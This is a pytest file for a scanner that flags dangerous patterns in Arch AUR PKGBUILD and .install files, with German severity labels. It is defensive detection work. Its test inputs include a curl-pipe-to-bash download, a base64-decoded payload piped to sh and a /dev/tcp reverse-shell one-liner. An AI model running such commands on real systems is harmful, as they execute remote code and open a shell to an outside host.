from update_planner import aur_samples
from update_planner import aur_scanner as sc


def ids(findings):
    return {f.rule_id for f in findings}


def test_clean_pkgbuilds_have_no_findings():
    for text in (aur_samples.PARU, aur_samples.VSCODE, aur_samples.YTDLP):
        assert sc.scan_text(text) == []


def test_curl_pipe_shell_is_critical():
    f = sc.scan_text('build() {\n  curl -fsSL https://x.example/s.sh | bash\n}\n')
    assert 'AUR001' in ids(f)
    assert any(x.severity == 'kritisch' for x in f)


def test_base64_exec_and_reverse_shell():
    assert 'AUR002' in ids(sc.scan_text('post_install() {\n echo aGk= | base64 -d | sh\n}\n', 'x.install'))
    assert 'AUR003' in ids(sc.scan_text('package() {\n bash -i >& /dev/tcp/1.2.3.4/9 0>&1\n}\n'))


def test_comments_are_ignored():
    assert sc.scan_text('# curl https://x | sh\npkgname=a\n') == []


def test_network_rule_is_scoped_to_functions():
    # curl im source-Array ist normal, in package() nicht
    assert 'AUR005' not in ids(sc.scan_text("source=('https://example.org/a.tar.gz')\n"))
    assert 'AUR005' in ids(sc.scan_text('package() {\n  wget https://example.org/x\n}\n'))
    assert 'AUR004' in ids(sc.scan_text('post_install() {\n  curl https://example.org/x\n}\n', 'a.install'))


def test_skip_checksum_rules():
    vcs = "source=('git+https://github.com/a/b.git')\nsha256sums=('SKIP')\n"
    assert 'AUR020' not in ids(sc.scan_text(vcs))
    plain = "source=('https://example.org/a.tar.gz')\nsha256sums=('SKIP')\n"
    assert [f.severity for f in sc.scan_text(plain) if f.rule_id == 'AUR020'] == ['hoch']


def test_http_with_gpg_is_downgraded():
    text = "source=('http://example.org/a.tar.gz')\nvalidpgpkeys=('ABC')\nsha256sums=('00')\n"
    assert {f.severity for f in sc.scan_text(text) if f.rule_id == 'AUR013'} == {'niedrig'}


def test_score_counts_each_rule_once():
    text = "source=('http://a.example/1'\n        'http://a.example/2'\n        'http://a.example/3')\n"
    r = sc.ScanResult('x', sc.scan_text(text))
    assert len([f for f in r.findings if f.rule_id == 'AUR013']) == 3
    assert r.score == sc.SEVERITY_POINTS['mittel']


def test_malicious_demo_package_is_dangerous_and_marks_new_lines():
    r = sc.scan_package('screen-recorder-plus-bin', aur_samples.AUR_META['screen-recorder-plus-bin'])
    assert r.score == 100 and r.verdict[0].startswith('Gefährlich')
    assert any(f.new_in_update for f in r.findings)
    assert 'META06' in ids(r.findings)  # neue Download-Domain


def test_maintainer_header_change_detected():
    old = '# Maintainer: alice <a@x>\npkgname=a\n'
    new = '# Maintainer: mallory <m@x>\npkgname=a\n'
    meta = dict(maintainer='mallory', votes=100, first_submitted='2020-01-01', files={'PKGBUILD': (old, new)})
    r = sc.scan_package('a', meta)
    assert any(f.rule_id == 'META02' for f in r.findings)


def test_diff_lines():
    d = sc.diff('a\nb\n', 'a\nc\n', 'PKGBUILD')
    kinds = [k for k, _ in d]
    assert '+' in kinds and '-' in kinds


# ------------------------------------------------------------------ Funktionskontext (Review 1.5.0)

def _ctx(text):
    lines, certain = sc._contexts(text.splitlines())
    return [c.func for c in lines], certain


def test_nested_blocks_keep_function_context():
    text = ('build() {\n'
            '  if true; then\n'
            '    for f in *; do { echo "$f"; }; done\n'
            '  fi\n'
            '  wget https://example.org/x\n'
            '}\n'
            'pkgdesc="after"\n')
    funcs, certain = _ctx(text)
    assert certain and funcs == ['build', 'build', 'build', 'build', 'build', 'build', '']
    assert [f.line for f in sc.scan_text(text) if f.rule_id == 'AUR005'] == [5]


def test_braces_in_strings_comments_and_expansions_do_not_shift_depth():
    text = ('prepare() {\n'
            '  echo "}"  # }\n'
            "  sed -i 's/{/[/' x\n"
            '  cd "${srcdir}/${pkgname%-bin}"\n'
            '  curl -o y https://example.org/y\n'
            '}\n')
    funcs, certain = _ctx(text)
    assert certain and funcs[:5] == ['prepare'] * 5 and funcs[5] == 'prepare'
    assert 'AUR005' in ids(sc.scan_text(text))


def test_one_line_and_keyword_functions():
    funcs, certain = _ctx('build() { make; }\nfunction package {\n  wget https://x.example/a\n}\npkgrel=1\n')
    assert certain and funcs == ['build', 'package', 'package', 'package', '']
    assert 'AUR005' in ids(sc.scan_text('build() { wget https://x.example/a; }\n'))


def test_split_package_functions_count_as_package():
    assert 'AUR005' in ids(sc.scan_text('package_foo() {\n  curl -o x https://example.org/x\n}\n'))


def test_heredoc_braces_are_not_structure():
    text = ('package() {\n'
            '  cat > "$pkgdir/x.json" <<EOF\n'
            '{ "a": {\n'
            'EOF\n'
            '  wget https://example.org/z\n'
            '}\n')
    funcs, certain = _ctx(text)
    assert certain and set(funcs) == {'package'}
    assert 'AUR005' in ids(sc.scan_text(text))


def test_toplevel_commands_run_when_sourced():
    assert 'AUR005' in ids(sc.scan_text('pkgname=a\ncurl -o /tmp/x https://example.org/x\n'))
    assert 'AUR005' in ids(sc.scan_text('pkgver=$(curl -s https://example.org/v)\n'))
    # Beschreibungen und Abhängigkeitslisten sind keine Befehle
    assert 'AUR005' not in ids(sc.scan_text('pkgdesc="A wget clone "\ndepends=(curl wget )\nmakedepends=(\n  curl \n)\n'))


def test_uncertain_structure_falls_back_to_whole_file():
    # Funktionsrumpf als Subshell – der Parser erkennt die Grenzen nicht sicher
    text = 'package() (\n  cd x\n  wget https://example.org/a\n)\n'
    f = sc.scan_text(text)
    assert 'AUR000' in ids(f) and 'AUR005' in ids(f)
    f = sc.scan_text('build() {\n  echo "unterminated\n}\nwget https://example.org/a\n')
    assert 'AUR000' in ids(f) and 'AUR005' in ids(f)
    assert sc.ScanResult('x', [x for x in f if x.rule_id == 'AUR000']).score == 0     # nur ein Hinweis


def test_install_file_is_scanned_everywhere():
    assert 'AUR004' in ids(sc.scan_text('post_install() {\n  curl https://example.org/x\n}\n', 'foo.install'))
    assert 'AUR004' in ids(sc.scan_text('curl https://example.org/x\n', 'foo.install'))      # oberste Ebene
    assert 'AUR004' in ids(sc.scan_text('helper() {\n  wget https://example.org/x\n}\npost_install() { helper; }\n',
                                        'foo.install'))
    assert 'AUR004' not in ids(sc.scan_text('package() {\n  echo curl\n}\n'))                 # PKGBUILD


def test_install_names_resolve_variables_and_split_packages():
    text = ('pkgbase=foo\ninstall=$pkgname.install\npackage_foo-cli() {\n  install="${pkgbase}-cli.install"\n}\n'
            'install=foo-$pkgver.install\n')
    assert sc.install_names(text, 'foo', 'foo') == ['foo.install', 'foo-cli.install']


def test_meta_findings_tolerate_malformed_remote_data():
    meta = dict(maintainer=None, votes='many', first_submitted='not-a-date', maintainer_changed=17, files={})
    r = sc.scan_package('x', meta)
    assert {'META01', 'META03'} <= ids(r.findings)
